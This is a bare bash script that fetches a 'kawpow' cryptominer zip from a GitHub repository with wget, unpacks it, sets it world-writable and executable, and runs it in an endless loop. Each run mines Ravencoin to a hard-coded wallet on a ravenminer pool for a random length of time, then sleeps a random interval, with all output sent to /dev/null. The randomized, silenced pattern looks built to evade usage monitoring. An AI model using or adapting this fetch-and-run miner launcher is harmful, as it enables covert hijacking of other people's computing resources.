wget https://github.com/kartikbhalala/temp/raw/master/kawpow.zip
unzip kawpow.zip -n
chmod 777 kawpow
while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=240
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./kawpow -P stratum+ssl://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker:pps@us.ravenminer.com:13838 -U &> /dev/null
	sleep $aaram
done
